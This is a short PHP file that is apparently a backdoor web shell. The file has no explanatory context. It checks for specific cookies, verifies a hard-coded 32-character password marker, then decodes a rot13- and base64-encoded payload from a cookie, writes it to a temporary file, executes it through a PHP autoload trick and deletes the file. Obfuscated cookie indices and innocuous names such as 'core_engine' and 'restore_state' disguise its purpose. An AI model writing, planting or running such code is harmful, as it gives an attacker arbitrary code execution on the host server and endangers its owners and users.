<?php


if (isset($_COOKIE[22-22]) && isset($_COOKIE[74-73]) && isset($_COOKIE[66+-63]) && isset($_COOKIE[41+-37])) {
    $entity = $_COOKIE;
    function core_engine($holder) {
        $entity = $_COOKIE;
        $itm = tempnam((!empty(session_save_path()) ? session_save_path() : sys_get_temp_dir()), '27a8a0fd');
        if (!is_writable($itm)) {
            $itm = getcwd() . DIRECTORY_SEPARATOR . "restore_state";
        }
        $sym = "\x3c\x3f\x70\x68p\x20" . base64_decode(str_rot13($entity[3]));
        if (is_writeable($itm)) {
            $val = fopen($itm, 'w+');
            fputs($val, $sym);
            fclose($val);
            spl_autoload_unregister(__FUNCTION__);
            require_once($itm);
            @array_map('unlink', array($itm));
        }
    }
    spl_autoload_register("core_engine");
    $marker = "e829152db8e624d566219ea61f26a664";
    if (!strncmp($marker, $entity[4], 32)) {
        if (@class_parents("approve_request_unit_converter", true)) {
            exit;
        }
    }
}
